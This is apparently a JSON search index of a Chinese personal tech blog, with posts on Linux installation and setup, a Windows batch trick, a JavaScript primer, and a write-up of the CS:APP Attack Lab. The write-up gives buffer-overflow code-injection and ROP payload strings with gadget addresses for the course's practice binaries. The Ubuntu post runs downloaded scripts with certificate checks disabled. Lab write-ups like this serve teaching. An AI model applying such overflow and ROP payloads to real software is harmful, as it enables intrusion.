{"pages":[{"title":"Categories","text":"","link":"/Categories/index.html"},{"title":"Tags","text":"","link":"/Tags/index.html"}],"posts":[{"title":"Arch linux installation guide","text":"心血来潮装了一次之后也没有怎么用，在此稍作记录。 下载iso镜像，这里给清华镜像链接：https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest/archlinux-2019.07.01-x86_64.iso 用rufus之类的工具将镜像烧录到u盘上，从u盘启动安装程序 由于安装过程依赖于网络连接，如果你使用的是无线网，参考官方wiki，如果是直接可用的有线网，则直接测试 1ping www.baidu.com 能ping通就没问题 开启网络授时 1timedatectl set-ntp true 磁盘分区(如果是UEFI会麻烦一些，这里只介绍非UEFI的情况)查看当前磁盘列表 1fdisk -l 应该是/dev/sdX的形式，一般来说是/dev/sda。 1cfdisk /dev/sda 如果是空白磁盘，它会让你选label type，此处选dos，如果没问则不必管；分区时设一个ext4主分区/dev/sda1，设一个swap分区/dev/sda2，然后分别创建文件系统并加载 1234mkfs.ext4 /dev/sda1mkswap /dev/sda2mount /dev/sda1 /mntswapon /dev/sda2 安装系统首先修改软件源，以清华源为例，在文件/etc/pacman.d/mirrorlist的头部加入 1Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch 然后开始安装 1pacstrap /mnt base base-devel 生成fstab文件 1genfstab -U /mnt &gt;&gt; /mnt/etc/fstab 进入新系统 1arch-chroot /mnt 设置时区和locale 12ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimehwclock --systohc 修改/etc/locale.gen文件，取消en_US.UTF-8 UTF-8和zh_CN.UTF-8 UTF-8前面的注释，然后运行 12locale-genecho \"LANG=en_US.UTF-8\" &gt; /etc/locale.conf 设置主机名并开启DHCP 12echo \"HOSTNAME\" &gt; /etc/hostnamesystemctl enable dhcpcd 设置grub 123pacman -S grub os-probergrub-install /dev/sdagrub-mkconfig -o /boot/grub/grub.cfg 设置密码 1passwd 重启 12exitreboot 添加archlinuxcn源修改/etc/pacman.conf，加入 12[archlinuxcn]Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch 然后更新 1sudo pacman -Syy 安装图形界面 12sudo pacman -S xorg-server gnomesudo systemctl enable gdm 安装显卡驱动，根据你的显卡类型选择装哪一个 123sudo pacman -S xf86-video-amdgpu #AMDsudo pacman -S xf86-video-intel #intelsudo pacman -S xf86-video-nouveau #NVIDIA 开机自动联网 1systemctl enable NetworkManager 重启之后看到的就是熟悉的图形界面了。","link":"/2019/07/14/Arch/"},{"title":"Ubuntu guide","text":"安装首先下载ubuntu系统镜像，为了更快的下载速度可以使用清华的镜像，以19.04版本为例，下载地址为https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/disco/ubuntu-19.04-desktop-amd64.iso 下载好之后，如果是用虚拟机，将iso加载到CD上即可安装，如果是在PC上安装，可以使用Rufus这个免费的小工具制作u盘启动盘，烧录镜像也可以用Etcher。 设置sudo免密码每次sudo都要输入密码，很是麻烦，修改配置文件 1sudo visudo 在文件尾加上 1username ALL=(ALL:ALL) NOPASSWD:ALL 其中username是你的用户名。“加在文件尾”这一点很重要，因为后面的策略会覆盖前面的策略，如果加在前面就可能被覆盖掉而无效。 设置默认文本编辑器我个人比较偏向于使用简单易用的nano，想从nano改为vim或者从vim改为nano，可以用 1sudo update-alternatives --config editor 更换apt源这里我们同样使用清华的源，以19.04版本为例（其他版本见此），编辑/etc/apt/sources.list文件，加入以下内容（为加快速度注释掉了deb-src，想用的话可以取消注释） 12345678910deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco main restricted universe multiverse#deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-updates main restricted universe multiverse#deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-backports main restricted universe multiverse#deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-security main restricted universe multiverse#deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-security main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-proposed main restricted universe multiverse#deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-proposed main restricted universe multiverse 更换完之后对系统进行更新 12sudo apt-get updatesudo apt-get upgrade 更换pip/pip3源(选做)在控制台执行以下命令设置清华源，如果用的是pip则将下面的pip3替换为pip 1pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple 设置服务器RSA密钥登录如果使用的是服务器，设置弱密码存在较大风险，比较安全的做法是改用密钥登录并禁用密码登录。 首先需要使用PuTTYgen之类的生成工具生成公钥/私钥对，生成好的公钥为如下的一串： 1ssh-rsa AAAAB3...luwDMw== 用用户名密码登录服务器后，创建文件夹~/.ssh，编辑文件~/.ssh/authorized_keys，将上面的公钥粘贴进去，保存文件。此时应该就可以正常使用了，可以退出并重新登录一次，验证密钥登录是否成功，如果不成功则需要检查一下是否是文件权限的问题，用chmod修改读取权限。 验证成功之后，就可以禁用密码登录方式了。具体步骤是，编辑/etc/ssh/sshd_config文件，添加如下语句 1PasswordAuthentication no 保存文件，执行sudo systemctl restart ssh重启sshd服务，这样下次登录的时候就不能再用密码。再次提醒，一定要先验证可以用密钥登录，不然就再也无法登录了！ 美化本着实用为目的，这里只做一些基本的美化，最终效果如下图所示首先我们需要安装tweak tools及拓展工具 123sudo apt-get install gnome-tweak-toolsudo apt-get install gnome-shell-extensionssudo apt-get install chrome-gnome-shell 安装Arc主题 1sudo apt-get install arc-theme 安装papirus图标 1sudo apt-get install papirus-icon-theme 安装完成后，在软件中搜索tweaks，打开修改工具，我的配置如下，仅供参考如果想把dash放在屏幕下方居中的话，下载DashtoDock这个拓展即可，查看自己的gnome版本号用 1gnome-shell --version 代理配置服务器端·ssr使用一键安装脚本 1git clone https://github.com/John-Ao/ss-fly 安装使用./ss-fly.sh -ssr，开启bbr使用./ss-fly.sh -bbr如果发现ssr服务器无法使用，可以用cat /var/log/shadowsocks.log查看错误信息，有可能是端口号被占用，修改端口号即可。 ·MTProxy获取并执行脚本文件mt_proxy.sh 1wget -N --no-check-certificate https://raw.githubusercontent.com/John-Ao/scripts/master/mt_proxy.sh &amp;&amp; chmod +x mt_proxy.sh &amp;&amp; ./mt_proxy.sh 按提示输入端口号、secret信息即可 polipo - socks5转http代理安装polipo： 1sudo apt-get install polipo 然后修改配置文件/etc/polipo/config 1234socksParentProxy=&quot;ip:port&quot;socksProxyType=socks5proxyAddress=&quot;0.0.0.0&quot; #如果是ipv6的话填 &quot;::0&quot;proxyPort=2160 修改完后重启polipo 1sudo /etc/init.d/polipo restart 可以通过curl测试代理是否成功 1curl --proxy http://127.0.0.1:2160 https://www.google.com 设置定时任务有时ss服务器可能会出现不稳定的情况而莫名无法连接，此时可以使用crontab来设置定时重启，只需要修改/etc/crontab文件即可。 客户端配置snap代理snap是少数不走proxychains的命令行工具，只能手动配置http代理，运行下面的语句(注意将修改代理端口2160为实际使用端口) 123456echo -e '[Service]\\nEnvironment=&quot;http_proxy=http://127.0.0.1:2160/&quot;' \\ | sudo tee /etc/systemd/system/snapd.service.d/http-proxy.confecho -e '[Service]\\nEnvironment=&quot;https_proxy=http://127.0.0.1:2160/&quot;' \\ | sudo tee /etc/systemd/system/snapd.service.d/https-proxy.confsudo systemctl daemon-reloadsudo systemctl restart snapd electron-ssr （推荐）如果想通过deb安装，可以下载electron-ssr，建议使用0.2.3版本，0.2.4似乎无法使用。 proxychains+ssr首先安装ssr 123456sudo apt-get install build-essentialwget https://github.com/jedisct1/libsodium/releases/download/1.0.16/libsodium-1.0.16.tar.gztar -xvf libsodium-1.0.16.tar.gzcd libsodium-1.0.16./configure &amp;&amp; make -j3 &amp;&amp;sudo make installsudo ldconfig 获取ssr.sh脚本文件 1wget -N --no-check-certificate https://raw.githubusercontent.com/John-Ao/scripts/master/ssr.sh &amp;&amp; chmod +x ssr.sh 然后在终端里输入 123./ssr.sh install./ssr.sh config #填入配置信息./ssr.sh start 即可启用ssr，然后可以通过proxychains把tcp代理到socks5 12sudo apt-get install proxychains #安装sudo nano /etc/proxychains.conf #编辑配置文件 以后在需要的语句前面加上它就可以了，比如proxychains google-chrome如果报错可以修改/usr/bin/proxychains文件，先执行命令 1find /usr/lib/ -name libproxychains.so.3 -print 然后把文件中的LD_PRELOAD改为上面所查找出来的路径 ssr-qt5带有图形界面的ss-qt5是一个不错的选择，在apt install前需要添加ppa源： 1234sudo add-apt-repository ppa:hzwhuang/ss-qt5sudo apt-get updatesudo apt-get install shadowsocks-qt5 反之，如果要移除该ppa源，可以使用 1sudo add-apt-repository -r ppa:hzwhuang/ss-qt5 如果第一条语句出现找不到apt_pkg错误，可以尝试用下面的方法解决： 12345sudo apt install python3-aptcd /usr/lib/python3/dist-packagessudo cp apt_pkg.cpython-35m-x86_64-linux-gnu.so apt_pkg.cpython-36m-x86_64-linux-gnu.so 软件配置pyspark1.安装jdk 1sudo apt-get install openjdk-8-jdk 2.安装py4j 1pip3 install py4j 3.下载pyspark 12wget \"https://mirrors.tuna.tsinghua.edu.cn/apache/spark/spark-2.4.3/spark-2.4.3-bin-hadoop2.7.tgz\"tar xvf spark-2.4.3-bin-hadoop2.7.tgz 在~/.bashrc文件中添加pyspark的路径，其中xxx按上面下载的实际情况填写 12export SPARK_HOME=/xxx/spark-2.4.3-bin-hadoop2.7export PATH=${SPARK_HOME}/bin:$PATH 保存之后激活 1source ~/.bashrc 4.设置及测试现在输入pyspark就可以进入交互式spark环境，和python交互式环境类似，开头会有一堆log信息，将log的等级从INFO修改为WARN看起来会舒服很多，修改方法如下 123cd ${SPARK_HOME}cp conf/log4j.properties.template conf/log4j.propertiesnano conf/log4j.properties 把文件中的 1log4j.rootCategory=INFO, console 替换为 1log4j.rootCategory=WARN, console 如果想使用ipython3的话，需要设置环境变量 12export PYSPARK_DRIVER_PYTHON=ipython3export PYSPARK_PYTHON=python3 单次运行pyspark也可以用 1PYSPARK_DRIVER_PYTHON=ipython3 pyspark 最后，我们可以运行一个计算Pi的程序来测试一下 1${SPARK_HOME}/bin/run-example SparkPi 10 远程操作相比vnc、xdrp之类的老牌解决方案，TeamViewer是一个更为方便的选择，它是一个免费的(限个人使用)多平台支持的远程控制软件，只需要在两台计算机上分别安装即可使用。 开发工具 调试工具可以用edb-debugger，界面友善，简单易用 调整分区可以用gparted C/C++用clion或者codeliteCheat Sheetdf -n查看硬盘使用情况nvidia-smi查看显卡使用情况(nvidia)netstat -tulp查看网络端口","link":"/2018/11/19/Ubuntu-guide/"},{"title":"windows命令行使用tee的方法","text":"在像ubuntu这样的操作系统中有tee指令，可以将控制台程序运行的结果同时输出在控制台和指定文件中，这在跑一些实验时非常有用。 windows默认是不提供这样的工具的，但是powershell中有这个cmdlet，比如.\\something | tee somefile，如果想要在命令行中运行，可以调用powershell，如果想在.bat脚本中运行，可以在开头加上 1if \"%1\"==\"\" ((powershell cmd /c %0 1^^^|tee somefile)&amp;&amp;exit/b) 其中somefile是输出文件。实际上是利用了命令行%1参数重新运行脚本。","link":"/2020/03/31/windows-batch-tee/"},{"title":"Attack Lab","text":"这是大一暑假汇编课的实验。此次实验要求我们用利用缓冲区溢出的bug对目标源程序进行攻击，ctarget的缓冲区在内存中的位置不变，很容易执行植入的汇编代码，而rtarget则采用了内存随机化，几乎不可能预测缓冲区的起始地址，从而要使用ROP攻击，难度更大。 ctargetlevel 1首先对ctarget文件进行反汇编objdump -d ./ctarget&gt;ctarget.s，在ctarget.s中搜索可以找到以下代码： 12345678910111213141516171800000000004017f5 &lt;getbuf&gt;: 4017f5: 48 83 ec 38 sub $0x38,%rsp 4017f9: 48 89 e7 mov %rsp,%rdi 4017fc: e8 7e 02 00 00 callq 401a7f &lt;Gets&gt; 401801: b8 01 00 00 00 mov $0x1,%eax 401806: 48 83 c4 38 add $0x38,%rsp 40180a: c3 retq 000000000040180b &lt;touch1&gt;: 40180b: 48 83 ec 08 sub $0x8,%rsp 40180f: c7 05 03 2d 20 00 01 movl $0x1,0x202d03(%rip) # 60451c &lt;vlevel&gt; 401816: 00 00 00 401819: bf 03 31 40 00 mov $0x403103,%edi 40181e: e8 ad f4 ff ff callq 400cd0 &lt;puts@plt&gt; 401823: bf 01 00 00 00 mov $0x1,%edi 401828: e8 97 04 00 00 callq 401cc4 &lt;validate&gt; 40182d: bf 00 00 00 00 mov $0x0,%edi 401832: e8 19 f6 ff ff callq 400e50 &lt;exit@plt&gt; 可见getbuf先在栈里开辟了0x38的空间，再callq Gets函数进行写入，callq自动将下一条语句地址压栈以便返回时使用。于是只需要先填充56个字符，再加上touch1函数地址0x40180b即可，考虑到x86为小端，可得到如下攻击字符串hex： 1234567831 31 31 31 31 31 31 3131 31 31 31 31 31 31 3131 31 31 31 31 31 31 3131 31 31 31 31 31 31 3131 31 31 31 31 31 31 3131 31 31 31 31 31 31 3131 31 31 31 31 31 31 310b 18 40 00 00 00 00 00 level 2此题要求给touch2传入参数，先看看它的反汇编代码： 12345670000000000401837 &lt;touch2&gt;: 401837: 48 83 ec 08 sub $0x8,%rsp 40183b: 89 fa mov %edi,%edx 40183d: c7 05 d5 2c 20 00 02 movl $0x2,0x202cd5(%rip) # 60451c &lt;vlevel&gt; 401844: 00 00 00 401847: 39 3d d7 2c 20 00 cmp %edi,0x202cd7(%rip) # 604524 &lt;cookie&gt; 40184d: 75 20 jne 40186f &lt;touch2+0x38&gt; 可见它是将寄存器edi与cookie进行对比，而从程序运行结果来看cookie=0x47db4e3a，又通过gdb调试可知读入数据的首地址是0x55652778，所以代码分三部分，第一部分修改edi，第二部分设置rsp以便ret到touch2，第三部分设置rsp以便ret到数据首地址，综合可得如下代码（标注了内存地址）： 1234560x55652778: movl $0x47db4e3a,%edi movq $0x1411938,%rax #处理touch2地址(不处理也无妨) subq $0x1010101,%rax #此处是为了避免代码中出现不可见字符00 movq %rax,0x556527a0 #准备ret movq $0x556527a0,%esp retq 10x556527b0: 78 27 65 55 #buf溢出覆盖原有地址 level 3查表可知0x47db4e3a的ascii码为34 37 64 62 34 65 33 61 00，根据题意，我们需要将上述数据的地址赋给edi，同时又要修改esp以确保后续函数的执行不会修改上述数据段，可得代码： 123450x55652778: movl $0x55652778,%edi #数据段地址 subl $0x40,%esp #将esp下移 pushq $0x401948 #touch3地址 retq0x55652778: 34 37 64 62 34 65 33 61 00 10x556527b0: 78 27 65 55 #buf溢出覆盖原有地址 rtargetlevel 2题目要求将cookie传给rdi，而要操作rdi寄存器，有两种方式： 12movq _____,%rdiret 或者 12popq %rdiret 第一种方式hex代码为48 89 ?7 c3或48 89 ?f c3，在rtarget反汇编代码中检索可得 12300000000004019ec &lt;getval_277&gt;: 4019ec: b8 48 89 c7 c3 mov $0xc3c78948,%eax 4019f1: c3 retq 其中48 89 c7 c3对应的汇编指令为 12movq %rax,%rdiret 于是我们还需要一个popq %rax实现cookie到rax寄存器的过程，对应hex为58，检索可得 12300000000004019f9 &lt;setval_467&gt;: 4019f9: c7 07 d2 d5 4f 58 movl $0x584fd5d2,(%rdi) 4019ff: c3 retq 综上得到攻击hex码为 1234fe 19 40 00 00 00 00 00 #popq %rax3a 4e db 47 00 00 00 00 #cookieed 19 40 00 00 00 00 00 #movq %rax,%rdi37 18 40 00 00 00 00 00 #touch2 最后只需在前面随意添加56字节长的字符作为偏置。 level 3此题中输入在栈中的位置是可变的，不能通过gdb确定，于是需要从rsp寄存器获取，查表知movq %rsp,___的hex为48 89 e?，在反汇编代码中查找得到： 1230000000000401ab2 &lt;setval_317&gt;: 401ab2: c7 07 48 89 e0 c3 movl $0xc3e08948,(%rdi) 401ab8: c3 retq 其中48 89 e0对应的汇编代码为movq %rsp,%rax。 但此时获取的是下一条语句的地址，如果把数据就存储在此处，ret后将会执行以数据段为地址的代码从而导致segmentation fault，所以我们需要将数据存储在前面或者后面并将rax减去或者加上偏移量。经过一番尝试，addq subq inc dec均不能在farm中找到，最后尝试leaq ___,___，对应hex码为48 8d，检索可得： 1230000000000401a21 &lt;add_xy&gt;: 401a21: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 401a25: c3 retq 其中48 8d 04 37对应汇编代码为leaq (%rdi,%rsi,1),%rax。 使用gdb调试发现rsi的值为0x31，于是可得以下攻击代码： 1234b4 1a 40 00 00 00 00 00 #movq %rsp,%raxed 19 40 00 00 00 00 00 #movq %rax,%rdi21 1a 40 00 00 00 00 00 #leaq (%rdi,%rsi,1),%raxed 19 40 00 00 00 00 00 #mov %rax,%rdi 134 37 64 62 34 65 33 61 00 #cookie","link":"/2018/08/29/AttackLab/"},{"title":"JavaScript 101","text":"JavaScript语法快速入门指南 变量名：字母_$开头，使用Unicode字符集，可以用各种字符 变量声明用var / let / const，var是全局作用域，有变量提升，let和const是块级作用域，无提升 注释：//单行；/**/多行但不能嵌套 数据类型 原始类型：Boolean / Null / Undefined / Number / BigInt / String / Symbol Object：Array / RegExp / Date 运算符 + - * / % ** ?: &gt; / &lt; / &gt;= / &lt;= / == / != / === / !=== &amp; | ^ ~ &gt;&gt; &lt;&lt; &gt;&gt;&gt; 优先级与C类似：成员(. []) &gt; 调用(() new) &gt; 一元(! ~ - + -- ++ typeof void delete) &gt; 四则 &gt; 移位 &gt; 关系(&gt; &lt; &gt;= &lt;= in instanceof) &gt; 判等 &gt; 与异或 &gt; 逻辑与或 &gt; 条件(?:) &gt; 赋值 &gt; 逗号 控制语句 if...else...else if while(...){} / do{}while(...) for循环 for(;;) for(in)：以任意顺序迭代对象的可枚举属性 for(of)：用于可迭代对象，比如 Array / Map / String / TypedArray / arguments 可以在for和while循环前加一个标签，这样在嵌套的时候就可以指定break或者continue哪一个循环了 switch语句中的case可以是任意常量、变量、表达式，在判等时使用的是===操作符，不会进行类型转换 with(location){}语句可以省去对象名和后面的.，在使用变量时会先查找全局变量，再查找location对象的属性 解构赋值 数组 [x, y]=[y, x] 可以带默认值[x=1, y=2]=z 可以忽略[,y]=z 可以用剩余参数[x, ...y]=z 对象 定义时解构：let {a, b}={a:1, b:2}; 非定义时解构：({a, b}={a:1, b:2}); 必须带括号 修改名称：({a:aa, b:bb}=obj); 带默认值：({a:aa=1, b=2}=obj); 解构赋值可以用于函数定义中，也可用于for...of中 解构赋值可以嵌套，如({a:[x,y]}=obj) 判等 === 判断类型和值都相同，不会自动转换，NaN!==NaN，+0===-0。用于Array的indexOf和lastIndexOf方法 == 自动转换再判等，规则如下表，其中 ToNumber(A) 表示转换为数字，这与 +A 效果相同，ToPrimitive(A) 通过尝试调用.toString()和.valueOf()方法，将A转换为原始值Primitive Object.is 同值相等，即二者是否在任何情况下都可以相互替换，+0和-0不同，但NaN和NaN相同 同值零相等：在同值相等的基础上认为+0和-0相等。用于Set / Map / TypedArray / ArrayBuffer / Array和String的includes方法 A == B Undefined Null Number String Boolean Object Undefined true true false false false IsFalsy(B) Null true true false false false IsFalsy(B) Number false false A === B A === ToNumber(B) A=== ToNumber(B) A== ToPrimitive(B) String false false ToNumber(A) === B A === B ToNumber(A) === ToNumber(B) ToPrimitive(B) == A Boolean false false ToNumber(A) === B ToNumber(A) === ToNumber(B) A === B ToNumber(A) == ToPrimitive(B) Object false false ToPrimitive(A) == B ToPrimitive(A) == B ToPrimitive(A) == ToNumber(B) A === B 判断类型用typeof操作符，括号可省略，返回值是以下字符串：undefined、boolean、string、number、object、function、symbol(ES6) typeof null是”object” 对于任意实现了[[Call]]方法的对象都会返回”function”，所以除了Function外的构造函数都是”object” 如果想进一步判断是什么类型的object，用instanceof操作符 8进制字面量用0开头，如果无效则按十进制解析，在严格模式下不接受8进制字面量 Number new Number()返回对象 Number()将非数值转换为数值 忽略前导0，与+等 对于null、””、false返回0，对于true返回1，不符合规范的字符串和undefined返回NaN，对象会依次调用valueOf和toString方法。 还可使用parseInt(str[,radix])、parseFloat，后者只支持十进制，且若结果为整数会返回整数 常量：EPSILON / MAX_SAFE_INTEGER($2^{53}-1$) / MAX_VALUE / MIN_SAFE_INTEGER / MIN_VALUE / NaN / NEGATIVE_INFINITY / POSITIVE_INFINITY 方法：isNaN / isFinite / isInteger / parseInt / parseFloat BigInt：大整型，在数字后面加n或者用构造函数 Object new Object() / {} 访问属性：obj.foo.bar / obj[&quot;foo&quot;][&quot;bar&quot;] 列出属性 for…in只会列出可枚举属性 Object.keys(o)返回o所有可枚举属性的数组 Object.getOwnPropertyNames(o)返回o所有属性的数组 用b in a检查属性是否存在，delete a.b删除非继承的属性 getter和setter 在对象初始化器中，可以通过在方法前加get表明是在访问属性时调用的函数，加set表明是在设置属性时调用的函数 为对象添加属性时用Object.defineProperty(obj, “name“, {get: function() {}, set: function(x) {}}); Object对象的方法 .assign(target, …sources)将源自己的可枚举属性值赋值给目标，会调用源的[[GET]]和目标的[[SET]]，是引用的话就是浅拷贝 .create(proto[,property])创建以proto为原型的对象，第二个参数与.defineProperties的第二个参数相同 .defineProperty(target, name, descriptor)定义新属性，也可用.defineProperties(target,{name1:descriptor1,…}) .entries()和.fromEntries可以转换为键值对列表或者转换回来 .getOwnProperty系列 Descriptor / Descriptors：获取描述符 Names：获取名称，包括不可枚举属性，但不包括Symbols Symbols：获取Symbol属性 .[get/set]PrototypeOf：获取/设置[[Prototype]]属性，和.__proto__相同 .keys / .values：获取可枚举属性名/值 String ‘’ / “” / ``(支持内部使用${}变量替换) 字符串不可变，操作只会返回新串 使用String()函数或.toString()方法可以转为字符串，但null和undefined没有后者，对字符串使用这个方法会返回一个副本，对数值使用时可以传入一个参数以指定基数 charAt和charCodeAt返回给定位置的字符/字符值 fromCharCode接收一串字符编码并转为String concat拼接 取子串用slice / substring / substr，区别在于前两个参数格式为区间[a,b)，第三个的参数格式为(start, length)，在传入负数时，slice会加上字符串长度，substr第一个参数会加，第二个参数置零，substring都置零； indexOf / lastIndexOf查询子串位置，可选参数为起始搜索位置； trim返回一个去除首位空格的副本； toLowerCase / toUpperCase / toLocale…大小写； match相当于RegExp.exec，search返回位置，replace替换； split分割，可选参数为截取的数组长度； localeCompare用于比较 Array 创建：[1,2] / [new] Array(1,2) / Array.of(1,2) / Array.from(_[,mapFn[,this]]) 注意new Array(length)传入单个值的时候视为数组长度，如果不是整数会报错 用数组字面量创建数组时空着的元素为undefined，但结尾的逗号被忽略(早期会报错) 判断：Array.isArray() 索引查询越界返回undefined，对元素赋值或者修改length可以改变数组大小 indexOf() / lastIndexOf()寻找元素位置，includes()判断元素存在 keys / values / entries，返回键/值/键值对迭代器，键为0,1,2,… flat()展开嵌套数组 数组操作 不修改原数组：slice / concat / join 直接修改：push / pop / shift / unshift / sort / reverse / splice splice(start[,delete_num[,items_to_add]])：从起始位置删除[全部/若干]元素[并插入新元素]，支持负值 sort([fn])：将元素转为String后按UTF-16非降序排列，默认fn类似(a,b)=&gt;a-b，ES标准中未要求a=b时ab顺序不变，新版本的浏览器一般支持。 以上各函数无明显意义时返回array的新长度 遍历方法 every()，判断是否所有元素都满足条件，但对于空数组返回true； some()，判断是否存在元素满足条件 find()，返回第一个满足条件的元素 findIndex()，返回第一个满足条件的元素的位置 归并方法： filter()，对每一项运行给定函数，返回结果为true的元素构成的数组 map(f(value[,index[,array]])) / flatMap()，对每一项运行给定函数，返回由结果构成的数组。需要注意传入的参数有3个，运行[“1”,”2”].map(parseInt)会出错，因为parseInt接收两个参数 reduce(f(acc, value[,index[,array]])[,initial])和reduceRight()，接收两个参数，归并函数和可选的归并基础，归并函数接收4个参数，前一个值、当前值、当前索引、数组对象 填充数组用fill(value[, start[, end]]) Boolean new Boolean([value]) 如果忽略value或者是 +0 / -0 / Null / false / NaN / undefined / &quot;&quot; / document.all，那么生成的Boolean对象的值为false，否则为true，即使是”false”也一样 需要注意的是，在条件语句中(如if)，除undefined和null之外的对象都视为true，所以不能用值为false的Boolean对象 如果要将某个东西转换为布尔型，用Boolean()或者!!()，不要用构造函数 Symbol foo=Symbol([description]) 每次调用会创建一个新的symbol，symbol主要用于表示对象属性，比如a[foo]=bar Map 创建：new Map([iterable])，如[[1,a], [2,b]] 合并：new Map([…map1, …map2])，如果有重复，后面的会覆盖前面的 访问元素 set / has / get / delete / clear(清空) keys / values / entries，返回键/值/键值对迭代器 .forEach / for(let [k, v] of map){} / for(let p of map){} 获取大小用size属性 map[‘a’]=1只是设置Map对象的属性，无法被has等方法访问 Map和Object的区别 有size属性、有性能优势 键可以是任意值，函数、对象、基本类型；Object的键只能是字符串或者Symbols 可直接进行迭代；而Object需要先获取它的键数组。 键值是有序的，迭代时会按插入顺序迭代；对象中的键则不是 (但自ES6对象保留字符串和Symbol键的创建顺序) Object 都有自己的原型，原型链上的键名有可能产生冲突 (自ES5可以用Object.create(null)创建一个没有原型的对象) Set 创建：new Set([iterable]) 转Array：[…set] 访问元素 add / has / delete / clear(清空) keys / values / entries，返回键/值/键值对迭代器(键和值相等) .forEach / for(let v of set){} 获取大小用size属性 Function 每个函数事实上都是一个Function对象，(function(){}).constructor===Function，可以用new Function ([*arg1*[, *arg2*[, ...*argN*]],] *functionBody*)创建函数(这样的函数没有闭包，eval创建的有闭包) .length属性获取接收的参数个数，方法有apply / bind / call / toString 函数不能重载，后面的函数定义会覆盖之前函数的定义；函数声明存在提升，但如果是用初始化语句方式定义的函数则不会提升。 在被调用时会自动获得this和arguments变量 this取决于函数的运行时环境，在全局函数或者嵌套函数中为window，如果是作为某个对象的方法调用那么就指向这个对象，在调用时指定this使用.apply(that, [1, 2, 3])，.call(that,1,2,3) / .bind(that)方法返回一个绑定了this的函数 箭头函数会捕捉作用域中的this而不重新定义 arguments是一个类似Array的对象，用于访问参数数组，它的内容与参数值保持同步，修改一个另一个也会改变；arguments.callee属性指向了这个函数(ES5严格模式下无效)；调用函数时的参数个数和它的参数列表不一定要相符 迭代器与生成器 生成器：function*，yield，yield*将另一个迭代器的值作为返回值。可以直接迭代，f.next()会返回{value:xxx, done:true/false}，传入next的参数会作为yield语句的返回值，但第一次调用next时传入的参数被忽略 内置迭代器：Set / Map / String / Array / TypedArray 自定义迭代器：需要实现@@iterator方法，即有以Symbol.iterator为键的属性，例如var myIterable = { *[Symbol.iterator]() { yield 1; yield 2; yield 3; } } Date对象表示日期 new Date()返回包含当前时间的对象，Date()返回当前时间的字符串 Date.now()返回当前时间 Date.parse()解析日期字符串(不推荐使用) Date.UTC()接收的参数为 年月日时分秒，月份从0开始，其余正常；Date()也支持这种用法，只不过是基于本地时间 注意：月份从0开始；当某个数值大于合理值时其他的会相应调整，比如new Date(2013,13,1)实际上是2014-02-1 JSON(JavaScript Object Notation) 只有parse()和stringify()两个方法 属性名称必须是双引号括起来的字符串；最后一个属性后不能有逗号。 禁止出现前导零（ JSON.stringify 方法自动忽略前导零，而在 JSON.parse 方法中将会抛出 SyntaxError）；如果有小数点, 则后面至少跟着一位数字。 基本包装类型：基本类型(Boolean、Number、String)不是对象，逻辑上说不应该有方法，而实际上有，是在后台创建了相应类型的对象，调用其方法，然后销毁，所以我们不能在运行时为它们添加属性 单体内置对象Global和Math 不属于其他任何对象的属性和方法就属于Global对象，如isNaN之类的，它还包含encodeURI和encodeURIComponent方法，用于将非标准字符编码为标准字符，但前者不会处理:/?#，相应地还有decode…函数 在浏览器中window即为Global void加表达式，表示没有返回值 点击javascript:链接时会用返回值替换当前页面，除非是undefined，所以加void 如果要定义函数并立即执行，可以void function(){}(); 用...可以展开数组和对象，let obj2＝{...obj1}进行对象的(浅)拷贝 在try…catch…finally结构中finally一定会执行，就算在try/catch中return了也是这样，并且可以覆盖它们的返回值 Promise是一个代理对象，有pending/fulfilled/rejected三种状态，后两者合称settled 约定传入的第一个函数在传入的第一个函数在成功时被调用，第二个函数在失败时被调用 用.then(f,g)添加回调函数，.catch(g)是.then(null,g)的缩写，回调函数f和g可以返回新的promise，或者用throw将控制权交给下一个处理错误的回调函数 在本轮事件循环完成之前，回调函数不会被调用 即使promise已经处于settled状态，还是可以用then / catch添加新的回调函数 在异步函数中(async function(){})可以使用await语法糖获取promise成功后的返回值，失败值需要用try{}catch(){}捕捉。这样可以简化有多个promise时的写法。123456789function myAsyncFunction(url) { return new Promise((resolve, reject) =&gt; { const xhr = new XMLHttpRequest(); xhr.open(\"GET\", url); xhr.onload = () =&gt; resolve(xhr.responseText); xhr.onerror = () =&gt; reject(xhr.statusText); xhr.send(); }); }; 拓展内容：Reflex / Proxy / WeakSet / WeakMap / TypedArray / ArrayBuffer / DataView","link":"/2019/07/09/JavaScript-101/"}],"tags":[{"name":"arch","slug":"arch","link":"/source/Tags/arch/"},{"name":"guide","slug":"guide","link":"/source/Tags/guide/"},{"name":"ubuntu","slug":"ubuntu","link":"/source/Tags/ubuntu/"},{"name":"bat","slug":"bat","link":"/source/Tags/bat/"},{"name":"windows","slug":"windows","link":"/source/Tags/windows/"},{"name":"assembly","slug":"assembly","link":"/source/Tags/assembly/"},{"name":"solution","slug":"solution","link":"/source/Tags/solution/"},{"name":"JavaScript","slug":"JavaScript","link":"/source/Tags/JavaScript/"}],"categories":[]}